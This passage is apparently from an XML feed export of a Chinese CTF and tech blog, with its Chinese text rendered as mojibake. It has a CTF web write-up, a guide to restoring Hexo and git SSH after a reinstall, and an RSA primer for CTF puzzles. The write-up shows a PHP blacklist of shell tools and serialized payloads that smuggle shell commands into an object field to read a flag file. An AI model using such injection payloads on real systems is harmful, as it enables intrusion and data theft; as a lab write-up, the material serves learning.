class="string">'od'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line">        $black = []; </span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123; </span><br><span class="line">          <span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;  <span class="keyword">if</span>(stripos($values,$value))&#123;<span class="keyword">die</span>(<span class="string">"Attack!"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æˆ‘ä»¬å¯ä»¥ç”¨bashçš„ç‰¹æ€§ç»•è¿‡<br><a href="http://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p><p>å†æ”¹ä¸€ä¸‹payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; l\s &amp;&amp; index"</span>;    /</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å †æ–‡ä»¶åˆ—è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class </span><br><span class="line">  class.php </span><br><span class="line">  class.php.bak </span><br><span class="line">  image </span><br><span class="line">  index.php </span><br><span class="line">  index.php.bak </span><br><span class="line">  waf.php</span><br></pre></td></tr></table></figure><p>ç”¨pwdå‘½ä»¤æŸ¥çœ‹å½“å‰æ‰€åœ¨ç›®å½•ä¸º/appï¼Œå†findä¸€ä¸‹ï¼Œæ‰¾å‡ºè¯¥ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/app </span><br><span class="line">/app/class </span><br><span class="line">/app/class/win.php </span><br><span class="line">/app/class/flag.php </span><br><span class="line">/app/image </span><br><span class="line">/app/image/PUBG.jpg </span><br><span class="line">/app/index.php.bak </span><br><span class="line">/app/waf.php </span><br><span class="line">/app/class.php </span><br><span class="line">/app/class.php.bak </span><br><span class="line">/app/index.php</span><br></pre></td></tr></table></figure><p>æœ€åå‘ç°åº”è¯¥åœ¨flag.phpé‡Œé¢<br>äºæ˜¯æœ€åæ”¹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:45:&quot;/win.php &amp;&amp; sort /app/class/flag.php &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><a href="http://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>é‡è£…ç³»ç»Ÿåå¿«é€Ÿæ¢å¤hexoåšå®¢(ä¿ç•™äº†åŸæœ‰çš„åšå®¢æ–‡ä»¶å¤¹)</title>
      <link href="/backup-blog-again.html"/>
      <url>/backup-blog-again.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬äººåˆšå‡æœŸç»“æŸå›åˆ°å®¿èˆã€‚ã€‚å‘ç°è‡ªå·±çš„ç”µè„‘å¤–è®¾å…¨éƒ½æ²¡æœ‰äº†ååº”ï¼Œé‡è£…é©±åŠ¨ä¹Ÿä¸è¡Œï¼Œäºæ˜¯å°±åªèƒ½é‡è£…ç³»ç»Ÿäº†</p><p>é‡è£…ç³»ç»Ÿåå‘ç°åšå®¢çš„ç¯å¢ƒåˆå¾—é‡æ–°é…ç½®ï¼Œæˆ‘å°±ç®€å•è®°å½•ä¸€ä¸‹</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>é¦–å…ˆæˆ‘æŠŠgitè·ŸNodeè¿˜æœ‰hexoé‡è£…äº†ä¸€éï¼Œ<br>å› ä¸ºé‡è£…ç³»ç»Ÿæœ‰å¯èƒ½åˆ é™¤äº†é…ç½®æ–‡ä»¶åŒ…æ‹¬ç¯å¢ƒå˜é‡é‡Œé¢çš„ï¼Œæ²¡æœ‰é…ç½® name å’Œ email çš„è¯ï¼Œgit æ˜¯æ— æ³•æ­£å¸¸å·¥ä½œçš„ã€‚æ‰€ä»¥é¦–å…ˆå¾—é‡æ–°é…ç½®nameè·Ÿemail<br>åœ¨git bashé‡Œé¢è¾“å…¥ä¸‹é¢ä¸¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name=<span class="string">"ä½ çš„åå­—"</span></span><br><span class="line">git config --global user.email=<span class="string">"ä½ çš„é‚®ç®±"</span></span><br></pre></td></tr></table></figure><p>è®°å¾—è¦å†™<code>--global</code>æˆ‘å‘ç°å¦‚æœä¸å†™çš„è¯æ˜¯æ²¡æœ‰ç”¨çš„ã€‚ã€‚ã€‚ã€‚<br>å¯¹äº†å¦‚æœä¸Šé¢ä¸¤æ¡å‘½ä»¤failäº†çš„è¯ï¼Œè®°å¾—å…ˆç”¨å‘½ä»¤<code>git init</code>å†è¾“å…¥ä¸Šé¢ä¸¤æ¡å‘½ä»¤</p><p>ç„¶åå°±æ˜¯é‡æ–°ç”Ÿæˆç§åŒ™å¹¶æ·»åŠ è‡³gitåæµ‹è¯•é“¾æ¥<br>ç”Ÿæˆç§é’¥ï¼š<code>ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot;</code><br>æ¥ç€æŒ‰3ä¸ªå›è½¦å°±å¥½ï¼Œä¸­é—´ä½ ä¹Ÿå¯ä»¥è¾“å…¥å¯†ç ï¼Œä½ éšæ„ï¼Œå›è½¦å¯ä»¥è·³è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/c/Users/Mr.Yang/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:zA6wNJrFB6NcqS6eBog/AHlzQuvFjYpG759Yhh1lWGI xxxxxx@xxxxx.xxx(ä¸Šé¢è‡ªå·±çš„é‚®ç®±)</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|    +E .         |</span></span><br><span class="line"><span class="string">| ..+oo+          |</span></span><br><span class="line"><span class="string">| oo+*+.o         |</span></span><br><span class="line"><span class="string">|o.*===+o         |</span></span><br><span class="line"><span class="string">|==+*... S        |</span></span><br><span class="line"><span class="string">|B.+.o .o         |</span></span><br><span class="line"><span class="string">|++o. +  .        |</span></span><br><span class="line"><span class="string">| +o.+ .          |</span></span><br><span class="line"><span class="string">|.  o.o           |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><p>.sshç›®å½•ä¸‹å¾—åˆ°äº†ä¸¤ä¸ªæ–‡ä»¶ï¼š<code>id_rsaï¼ˆç§æœ‰ç§˜é’¥ï¼‰å’Œid_rsa.pubï¼ˆå…¬æœ‰å¯†é’¥ï¼‰</code><br>ä¸€èˆ¬éƒ½åœ¨Cç›˜ä½ è‡ªå·±çš„æ‰€åœ¨ç”¨æˆ·ç›®å½•ä¸‹çš„<code>./ssh</code>æ–‡ä»¶å¤¹ä¸­<br><a href="https://imgchr.com/i/CgrHN8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgrHN8.md.png" alt="CgrHN8.md.png"></a></p><p>ç„¶åæŠŠid_rsa.pubé‡Œé¢çš„å†…å®¹æ”¾åˆ°ä¸€ä¸ªæ–°çš„sshçš„å†…å®¹é‡Œé¢ï¼Œæ ‡é¢˜è‡ªå®šä¹‰ï¼Œä»¥å‰çš„ä¸è¦çš„sshä½ ä¹Ÿå¯ä»¥deleteæ‰<br>ä¸‹é¢æ˜¯è¿‡ç¨‹ï¼š<br>å…ˆåœ¨ä½ çš„GitHubå³ä¸Šè§’ä½ çš„ç”¨æˆ·é‚£é‡Œæ‰¾çš„Settingsâ€¦.<br><img src="https://s1.ax1x.com/2018/05/20/CgrO3Q.png" alt="CgrO3Q.png"><br>ç„¶ååœ¨å·¦è¾¹æ‰¾åˆ°SSHçš„è¿™ä¸ªä¸œè¥¿<br><img src="https://s1.ax1x.com/2018/05/20/Cgrxun.png" alt="Cgrxun.png"><br>æœ€ånewä¸€ä¸ªsshï¼Œè®°å¾—æŠŠid_rsa.pubé‡Œé¢çš„å…¨éƒ¨å†…å®¹æ”¾åˆ°é‡Œé¢ï¼Œæ ‡é¢˜è‡ªå®šä¹‰ï¼Œè·Ÿä¸€å¼€å§‹è®¾ç½®åšå®¢çš„æ—¶å€™å·®ä¸å¤š<br><a href="https://imgchr.com/i/Cgs9EV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgs9EV.md.png" alt="Cgs9EV.md.png"></a><br>ç„¶åé‡æ–°åœ¨git bash ä¸‹è¾“å…¥å‘½ä»¤æ£€æµ‹æ˜¯å¦æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host <span class="string">'github.com (207.97.227.239)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?  # ç›´æ¥è¾“å…¥yes</span></span><br><span class="line"><span class="string">Hi cnfeat! You'</span>ve successfully authenticated, but GitHub does not provide shell access</span><br></pre></td></tr></table></figure><p>å“ˆå“ˆï¼Œç„¶ååˆå¯ä»¥åƒä»¥å‰ä¸€æ ·å¼€å¿ƒçš„ä½¿ç”¨ <code>hexo g -d</code>äº†</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://www.cnblogs.com/zhanglianbo/p/5648206.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhanglianbo/p/5648206.html</a></p>]]></content>
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¤§è‡´äº†è§£ä¸€ä¸‹RSAä»¥åŠå‡ºé¢˜å¥—è·¯</title>
      <link href="/RSA-SimpleLearn.html"/>
      <url>/RSA-SimpleLearn.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>  æœ€è¿‘åšçš„CTFé¢˜ç›®é‡åˆ°RSAåŠ å¯†æ€»æ˜¯ä¸ä¼šï¼Œäºæ˜¯å‚è€ƒèµ„æ–™å­¦ä¹ ä¸€ç•ªï¼Œå°ç»“è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œæ€•è‡ªå·±æŸå¤©åˆå¿˜è®°äº†<br>RSAæ˜¯å±äºç°ä»£å¯†ç å­¦çš„èŒƒç•´ï¼Œç°ä»£å¯†ç å­¦çš„ç»ˆæç›®æ ‡æ˜¯:å‘æ˜æ°¸è¿œæ— æ³•ç ´è§£çš„åŠ å¯†ç®—æ³•<br>è€Œä»–ä»¬å¾ˆå¤šåˆæ˜¯è·ŸäºŒè¿›åˆ¶ç›¸å…³ï¼ŒäºŒè¿›åˆ¶åŠ å¯†çš„å”¯ä¸€ç®—æ³•  XOR<br>ä¸‹é¢ä¸¤ä¸ªæ ‡å‡†å°±å¾ˆå…¸å‹ã€‚ã€‚ã€‚<br>DES æ•°æ®åŠ å¯†æ ‡å‡†<br>AES é«˜çº§åŠ å¯†æ ‡å‡†<br>å¯¹äºä¸Šé¢çš„ä¸œè¥¿ä¸€çŸ¥åŠè§£ã€‚ã€‚ä»€ä¹ˆè½®å­å‡½æ•°éƒ½æ²¡äº†è§£æ¸…æ¥šï¼Œè¿˜æœ‰ä¸€äº›ä»€ä¹ˆç›’å­ä¹‹ç±»çš„ä¸œè¥¿ã€‚ã€‚ã€‚emmmä»¥ååœ¨æ·±ç©¶å§</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>è·Ÿæ ‡é¢˜ä¸€æ ·ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£RSAç®—æ³•ï¼Œç„¶åæŠŠè‡ªå·±å¾—ç†è§£å†™å‡ºæ¥ï¼Œæ¯•ç«Ÿé‚£äº›ä»€ä¹ˆæ¬§æ‹‰å…¬å¼ï¼Œä»€ä¹ˆé«˜æ–¯çš„æ•°è®ºï¼Œçœ‹ä¹Ÿçœ‹ä¸€åˆ°ä¸¤å¤©ï¼Œå¤ªè´¹æ—¶é—´ã€‚ã€‚ã€‚</p><p><strong>RSAæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå®ƒç”± å…¬é’¥ï¼ˆn/eï¼‰ï¼Œç§é’¥(n/d)ï¼Œæ˜æ–‡Må’Œå¯†æ–‡Cç»„æˆã€‚</strong></p><h3 id="RSAçš„å¤§è‡´è¿‡ç¨‹"><a href="#RSAçš„å¤§è‡´è¿‡ç¨‹" class="headerlink" title="RSAçš„å¤§è‡´è¿‡ç¨‹"></a>RSAçš„å¤§è‡´è¿‡ç¨‹</h3><p><a href="https://imgchr.com/i/CgsFCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsFCF.md.png" alt="CgsFCF.md.png"></a></p><p>é€‰å–ä¸¤ä¸ªå¤§ç´ æ•°ç”Ÿæˆn,på’Œqï¼Œn=p*q,è¿™é‡Œçš„nç›®å‰å¤§éƒ½æ˜¯åœ¨1024ä½å·¦å³ï¼Œéš¾ä»¥ç ´è§£ï¼Œå› ä¸ºå®ƒè¶Šé•¿ï¼Œåˆ†è§£èµ·æ¥å°±è¶Šéš¾<br>éšæœºé€‰å–åŠ å¯†å¯†é’¥eï¼Œä¿è¯eå’Œ(p-1)(q-1)äº’ç´ </p><p>è®¡ç®—è§£å¯†ç§é’¥ <code>e*d â‰¡ 1 mod (p-1)(q-1)</code></p><p>åŠ å¯†   <code>c=m^e mod n</code></p><p>è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„cæŒ‡çš„æ˜¯å¯†æ–‡ï¼ŒmæŒ‡çš„æ˜¯æ˜æ–‡<br>å…¶ä¸­(n,e)ä¸ºå…¬é’¥ï¼Œ(n,d)ä¸ºç§é’¥</p><h3 id="ä»‹ç»ä¸€ä¸ªåŒä½™è¿ç®—çš„æ¦‚å¿µ"><a href="#ä»‹ç»ä¸€ä¸ªåŒä½™è¿ç®—çš„æ¦‚å¿µ" class="headerlink" title="ä»‹ç»ä¸€ä¸ªåŒä½™è¿ç®—çš„æ¦‚å¿µ"></a>ä»‹ç»ä¸€ä¸ªåŒä½™è¿ç®—çš„æ¦‚å¿µ</h3><p>ä¸¤ä¸ªæ•´æ•°a,bï¼Œå®ƒä»¬é™¤ä»¥æ•´æ•°Mæ‰€å¾—çš„ä½™æ•°ç›¸ç­‰ï¼š<code>a â‰¡ b(mod m)</code>ï¼Œæ¯”å¦‚è¯´5é™¤3ä½™æ•°ä¸º2ï¼Œ11é™¤3ä½™æ•°ä¹Ÿä¸º2ï¼Œäºæ˜¯å¯å†™æˆ<code>11 â‰¡ 5(mod 3)</code></p><p>ç„¶åå°±åšäº†å‡ ä¸ªé¢˜ç›®ï¼Œå‘ç°å«Œä»–ä»¬çš„å¥—è·¯å°±æ˜¯ä¸åœçš„ç©è½¬è¿™å‡ ä¸ªå‚æ•°ã€‚ã€‚ã€‚ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å·²çŸ¥pã€qã€eæ±‚d</span><br><span class="line">å·²çŸ¥pã€qã€eå’Œå¯†æ–‡ æ±‚æ˜æ–‡</span><br><span class="line">å·²çŸ¥nã€eå’Œå¯†æ–‡ æ±‚æ˜æ–‡</span><br><span class="line">å·²çŸ¥å…¬é’¥å’Œå¯†æ–‡ æ±‚æ˜æ–‡</span><br></pre></td></tr></table></figure></p><h3 id="è¿˜æœ‰å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ç›¸å…³å·¥å…·çš„ç”¨æ³•"><a href="#è¿˜æœ‰å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ç›¸å…³å·¥å…·çš„ç”¨æ³•" class="headerlink" title="è¿˜æœ‰å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ç›¸å…³å·¥å…·çš„ç”¨æ³•"></a>è¿˜æœ‰å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ç›¸å…³å·¥å…·çš„ç”¨æ³•</h3><h4 id="RSAtool"><a href="#RSAtool" class="headerlink" title="RSAtool"></a>RSAtool</h4><p>è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ï¼Œä½†è¿˜æ˜¯è§‰å¾—è„šæœ¬é¡ºæ‰‹<br><a href="https://imgchr.com/i/Cgsk34" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgsk34.md.png" alt="Cgsk34.md.png"></a></p><p>Keysize(Bits)ï¼šå¡«å†™ä½ Nçš„ä½æ•°<br>Public Exp.(E)ï¼šå¡«å†™ä½ çš„eçš„åè¿›åˆ¶å€¼<br>Number Baseï¼šå¡«å†™ä½ ä¸‹é¢Nçš„è¿›åˆ¶ï¼ˆä¸€èˆ¬é‡‡ç”¨10è¿›åˆ¶ï¼‰<br>Modulus(N)ï¼šå¡«å†™Nçš„åè¿›åˆ¶æ•°ï¼ˆå’ŒNumber Baseå¡«å†™çš„è¦å¯¹åº”ï¼‰<br>ç„¶åç‚¹å‡»å·¦ä¸‹è§’çš„Factor N<br>å°±ä¼šè‡ªåŠ¨åˆ†è§£å‡ºPå’ŒQ<br>ç„¶åç‚¹å‡»å·¦ä¸‹è§’çš„Calc. D<br>å°±ä¼šè‡ªåŠ¨è®¡ç®—å‡ºD<br>ç„¶åç‚¹å‡»å·¦ä¸‹è§’çš„Test<br>ï¼ˆè¿™é‡Œå¥½åƒæœ‰ä¸ªBugï¼Œè¦å…ˆåŠ å¯†ä¸€æ¬¡ï¼Œæ‰èƒ½ç”¨è§£å¯†åŠŸèƒ½ï¼‰<br>ç„¶åæŠŠä½ çš„å¯†æ–‡æ”¾åœ¨resulté‡Œï¼Œç‚¹å‡»decrypto<br>å³å¯å¾—åˆ°è§£å¯†åçš„ç­”æ¡ˆ</p><h4 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h4><p>ä¸€ä¸ªå¤§æ•°åˆ†è§£å·¥å…·<br>ç”¨å‘½ä»¤è¡Œè¿›å…¥æ‰“æ­¤ç›®å½•ä¸‹ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼ŒNæ˜¯ä½ è¾“å…¥çš„å¤§æ•°<br>yafu-x64.exe factor(N)<br><a href="https://imgchr.com/i/CgsZuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsZuR.md.png" alt="CgsZuR.md.png"></a></p><p>è¿˜æœ‰ä¸€ä¸ªPARIã€‚ã€‚ã€‚è¿™å¥½åƒä¹Ÿæ˜¯ä¸€ç§è¯­è¨€ã€‚ã€‚ä¸€èˆ¬æ˜¯ç”¨æ¥å°†å¤§æ•°16è¿›åˆ¶è½¬10è¿›åˆ¶ã€‚ã€‚æˆ–è€…æ˜¯åˆ¤æ–­Nçš„ä½æ•°ä½¿ç”¨<br><a href="https://imgchr.com/i/CgsHq1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsHq1.md.png" alt="CgsHq1.md.png"></a><br>åæ­£ä¸ç†äº†ï¼ŒæŒ‡ä»¤ä¹Ÿå¾ˆç®€å•ï¼š<br>ç¬¬ä¸€æ­¥:<code>è¾“å…¥æ•°å­—</code><br>ï¼ˆå½“ç„¶ï¼Œå¦‚æœè¾“å…¥16è¿›åˆ¶ï¼Œä½ è¦å¸¦ä¸Š0xï¼Œä»–ä¼šåº•ä¸‹è‡ªåŠ¨ç»™ä½ æ˜¾ç¤º10è¿›åˆ¶ï¼Œååˆ†æ–¹ä¾¿ï¼‰<br>ç¬¬äºŒæ­¥: <code>binary(x)</code><br>ä»–å°±ä¼šå¸®ä½ æŠŠè¿™ä¸ªå¤§æ•°åˆ†è§£æˆ2è¿›åˆ¶<br>ç¬¬ä¸‰æ­¥: <code>length(x)</code><br>ä»–å¯ä»¥å¸®ä½ è¾“å‡ºè¿™ä¸ªNçš„ä½æ•°</p><h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><p>æœ‰æ—¶å€™é‡åˆ°ä¸‹é¢è¿™ç§æ ¼å¼çš„,å°±ä¼šé€‰æ‹©ç”¨openssl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX</span><br><span class="line">vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF</span><br><span class="line">GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+7LhsLNSTm9N6LTko0Xa</span><br><span class="line">RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx</span><br><span class="line">z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k</span><br><span class="line">EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw</span><br><span class="line">XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH</span><br><span class="line">jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7</span><br><span class="line">r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU</span><br><span class="line">N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx</span><br><span class="line">PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/</span><br><span class="line">wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/02/25/9dsjJA.png" alt="9dsjJA.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in public.key -pubin -noout -text -modulus</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢çš„public.keyå°±æ˜¯ä½ æ‰€éœ€è¦æŸ¥çœ‹çš„æ–‡ä»¶å</p><p>ç„¶åä½¿ç”¨å¯†é’¥æ–‡ä»¶è¿›è¡Œè§£å¯†çš„è¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure></p><p>flag.encæ˜¯åŠ å¯†æ–‡ä»¶  private.pemæ˜¯å¯†é’¥  flag.decè§£å¯†æ–‡ä»¶</p><p>é…åˆä¸‹é¢çš„Pythonè„šæœ¬åœ¨linuxä¸‹ä½¿ç”¨ï¼Œè®°å¾—åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p =  <span class="number">258631601377848992211685134376492365269</span></span><br><span class="line">keypair.q = <span class="number">286924040788547268861394901519826758027</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>è®°å¾—ä¿®æ”¹ä¸€ä¸‹p q 